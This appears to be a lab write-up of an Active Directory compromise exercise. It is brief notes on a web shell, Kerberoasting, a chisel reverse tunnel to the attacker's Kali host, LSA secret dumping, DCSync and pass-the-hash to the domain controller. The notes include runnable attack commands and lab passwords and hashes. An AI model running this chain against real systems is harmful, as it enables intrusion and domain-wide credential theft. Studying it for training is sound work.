- Before switching projects, our teammate left a password-protected web shell (with the credentials: 
- `admin`:`My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory.

# Attack
---
- Get meterpreter shell from antak
	- ![[Pasted image 20250817071322.png]]
 
## Kerberoasting
- Upload powerview.ps1
- Run:
	- `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat`
- Copy and clean hashes. Run hashcat: (svc_sql)
	- ![[Pasted image 20250817075043.png]]

# Pivoting using chisel
---
- Pivot using chisel
- On Kali:
	- `chisel server --socks5 --reverse -p 9999`
- On Windows:
	- Transfer `chisel_windows.exe`
	- `.\chisel_windows.exe client 10.10.16.63:9999 R:socks`
# Login to MS01
---
- Ping MS01 to discover its IP from windows session, then:
- `proxychains4 evil-winrm -u svc_sql -p lucky7 -i 172.16.6.50`
- ![[Pasted image 20250817181137.png]]
# More User Credentials
---
- Use `netexec` or `secretsdump` with proxychains and extract LSA secrets:
	- `proxychains4 netexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa`
	- `proxychains4 impacket-secretsdump -outputfile inlanefreight_hashes svc_sql:lucky7@172.16.6.50`
	- ![[Pasted image 20250817183706.png]]
	- ![[Pasted image 20250817183720.png]]

# DC compromise
---
- This user has **DCSync rights**
- We can run secretsdump to get all the user hashes from domain:
	- ping `DC01` to get its IP
	- `proxychains4 impacket-secretsdump -outputfile inlanefreight_hashes2 tpetty:'Sup3rS3cur3D0m@inU2eR'@172.16.6.3 -just-dc-ntlm`
	- ![[Pasted image 20250817190712.png]]
- Login as administrator using PassTheHash:
	- `proxychains4 evil-winrm -u Administrator -H '27dedb1dab4d8545c6e1c66fba077da0' -i 172.16.6.3`
	- ![[Pasted image 20250817190748.png]]